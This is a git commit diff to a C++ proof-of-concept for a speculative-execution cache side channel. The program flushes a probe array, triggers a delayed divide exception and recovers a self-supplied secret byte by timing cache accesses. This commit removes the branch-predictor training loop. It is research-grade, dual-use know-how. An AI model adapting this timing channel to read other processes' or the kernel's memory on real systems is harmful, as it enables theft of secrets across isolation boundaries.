784f160bd6718c8c9dbf9ce4da9cc1cae51a5068
feruxmax <feruxmax@gmail.com>
2018-01-05 15:42:49 +0300

    remove multiple branch predictor training (no branch)

--- main.cpp
+++ main.cpp
@@ -12,9 +12,9 @@ const size_t MAX_SEND_VALUE = 8;
 void setup_signal_handler();
 int clear_cache();
 
-uint8_t *cache;
+volatile uint8_t *cache;
 
-int probe(uint8_t *adrs, uint8_t* data_out) {
+int probe(volatile uint8_t *adrs) {
     volatile unsigned long time;
 
     asm __volatile__ (
@@ -31,20 +31,17 @@ int probe(uint8_t *adrs, uint8_t* data_out) {
                 : "=a" (time)
                 : "c" (adrs)
                 : "%esi", "%edx");
+
     return time;
 }
 
 void recovery_secret(int sig)
 {
     int times[MAX_SEND_VALUE];
-    int sum = 0;
 
     for(int i=0;i<MAX_SEND_VALUE;i++)
     {
-        uint8_t data;
-
-        times[i] = probe(cache + CACHE_LINE_SIZE*i, &data);
-        sum += data;
+        times[i] = probe(cache + CACHE_LINE_SIZE*i);
     }
 
     for(int i=0;i<MAX_SEND_VALUE;i++)
@@ -55,20 +52,18 @@ void recovery_secret(int sig)
     exit(sig);
 }
 
-int try_rise_exception(int div)
-{
-    int a=div;
-    for(int i=0;i<10000;i++)
-        a+=i;
-
-    return a / div;
-}
-
 int speculative_transfer(int div, uint8_t secret)
 {
     uint8_t data = 0;
     int res = 0;
-    data = try_rise_exception(div);
+
+    // rise_exception after delay
+    int a=div;
+    for(int i=0;i<100000;i++)
+        a+=i;
+    data = a / div;
+
+    // speculative
     res += cache[CACHE_LINE_SIZE*secret];
 
     return res + data;
@@ -79,24 +74,20 @@ int main(int argc, char *argv[])
     cout<<"start app\n";
 
     // setup cached memory
-    cache = (uint8_t*)aligned_alloc(CACHE_LINE_SIZE, CACHE_LINE_SIZE*MAX_SEND_VALUE);
-    memset(cache, 0, CACHE_LINE_SIZE*MAX_SEND_VALUE);
+    cache = (volatile uint8_t*)aligned_alloc(CACHE_LINE_SIZE, CACHE_LINE_SIZE*MAX_SEND_VALUE);
+    memset((void*)cache, 0, CACHE_LINE_SIZE*MAX_SEND_VALUE);
 
     setup_signal_handler();
 
     // input data
     char *p;
-    int BRANCH_PREDICTOR_TRAIN_COUNT = strtol(argv[1], &p, 10);
+    int div = strtol(argv[1], &p, 10);
     uint8_t secret = (uint8_t) strtol(argv[2], &p, 10);
-    cout<<"train: "<<BRANCH_PREDICTOR_TRAIN_COUNT-1<<" secret: "<<(int)secret<<endl;
+    cout<<"div: "<<div<<" secret: "<<(int)secret<<endl;
 
     // run
     int result = clear_cache();
-    for(int i=1;i<=BRANCH_PREDICTOR_TRAIN_COUNT;i++)
-    {
-        result += speculative_transfer(BRANCH_PREDICTOR_TRAIN_COUNT-i, secret);
-        result += clear_cache();
-    }
+    result += speculative_transfer(div, secret);
     cout<<"result: "<<result<<endl;
 
     recovery_secret(0);
@@ -121,6 +112,6 @@ void setup_signal_handler()
 int clear_cache()
 {
     for(int i=0;i<MAX_SEND_VALUE;i++)
-        __builtin_ia32_clflush(cache + CACHE_LINE_SIZE*i);
+        __builtin_ia32_clflush((void*)cache + CACHE_LINE_SIZE*i);
     return 0;
 }
